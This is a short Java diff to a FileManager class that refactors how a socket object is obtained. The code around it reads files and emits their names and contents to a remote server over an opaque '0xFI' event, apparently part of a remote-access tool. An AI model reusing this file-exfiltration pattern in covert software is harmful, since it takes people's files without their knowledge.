@@ -28,7 +28,7 @@ public class FileManager {
                 JSONObject errorJson = new JSONObject();
                 errorJson.put("type", "error");
                 errorJson.put("error", "Denied");
-                IOSocket.getInstance().getIoSocket().emit("0xFI" , errorJson);
+                IOSocket.getSocket().emit("0xFI" , errorJson);
             } catch (JSONException e) {
                 e.printStackTrace();
             }
@@ -77,7 +77,7 @@ public class FileManager {
                 object.put("type","download");
                 object.put("name",file.getName());
                 object.put("buffer" , data);
-                IOSocket.getInstance().getIoSocket().emit("0xFI" , object);
+                IOSocket.getSocket().emit("0xFI" , object);
                 buf.close();
             } catch (FileNotFoundException e) {
                 e.printStackTrace();
